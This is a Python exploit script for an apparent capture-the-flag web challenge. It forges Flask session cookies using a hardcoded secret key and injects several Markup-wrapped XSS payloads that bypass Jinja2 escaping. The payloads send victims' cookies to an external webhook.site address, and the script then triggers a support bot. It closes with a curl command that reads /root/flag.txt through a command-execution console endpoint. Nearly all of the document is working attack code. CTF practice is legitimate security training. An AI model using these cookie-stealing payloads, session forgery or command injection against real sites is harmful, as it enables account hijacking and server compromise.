#!/usr/bin/env python3
"""
Production Exploit for 0xrouter CTF
Uses Markup object to bypass Jinja2 escaping!
"""
import hashlib
import requests
import sys
import time
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
from markupsafe import Markup

# Config - CHANGE THESE
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://challenges4.ctf.sd:34844"
WEBHOOK = sys.argv[2] if len(sys.argv) > 2 else "https://webhook.site/029c641e-501d-47c8-87b2-ca71bd4410fb"
SECRET = "bca32ebbaa1be9c2dc1e3a5f867667326d552d06d4ba2e"

def forge_session(data):
    serializer = URLSafeTimedSerializer(
        SECRET, salt='cookie-session', 
        serializer=TaggedJSONSerializer(), 
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
    )
    return serializer.dumps(data)

print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║         PRODUCTION EXPLOIT - Markup XSS                              ║
║         Target: {TARGET:<50} ║
║         Webhook: {WEBHOOK:<49} ║
╚══════════════════════════════════════════════════════════════════════╝
""")

# Multiple XSS payloads to try
payloads = [
    # External webhook
    Markup(f'<img src=x onerror="new Image().src=\'{WEBHOOK}?c=\'+document.cookie">'),
    Markup(f'<script>fetch("{WEBHOOK}?jwt="+document.cookie)</script>'),
    Markup(f'<script>new Image().src="{WEBHOOK}?c="+encodeURIComponent(document.cookie)</script>'),
    
    # Relative /steal endpoint (works on same origin)
    Markup('<img src=x onerror="fetch(\'/steal?c=\'+document.cookie)">'),
    
    # Fetch with full options
    Markup(f'<script>fetch("{WEBHOOK}",{{method:"POST",body:document.cookie}})</script>'),
]

for i, xss_payload in enumerate(payloads):
    print(f"\n[{i+1}/{len(payloads)}] Payload: {str(xss_payload)[:70]}...")
    
    session_data = {
        'notes': [],
        'device_settings': {
            'firmware': 'v1.0.4',
            'model': xss_payload
        }
    }
    
    try:
        cookie = forge_session(session_data)
        print(f"    Cookie: {cookie[:50]}...")
        
        # Test if XSS renders
        resp = requests.get(f"{TARGET}/device_info", cookies={'session': cookie}, timeout=10)
        
        if 'onerror=' in resp.text or '<script>' in resp.text:
            print(f"    [+] XSS appears in response!")
        
        # Trigger bot
        resp = requests.post(f"{TARGET}/tech_support", cookies={'session': cookie}, timeout=30)
        print(f"    [+] Bot triggered: {resp.status_code}")
        
        time.sleep(2)
        
    except Exception as e:
        print(f"    [-] Error: {e}")

print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║  [!] Check your webhook NOW: {WEBHOOK:<36} ║
║                                                                      ║
║  If JWT received, get flag with:                                     ║
║  curl -H 'Cookie: jwt=<TOKEN>' '{TARGET}/console?cmd=cat+/root/flag.txt' ║
╚══════════════════════════════════════════════════════════════════════╝
""")
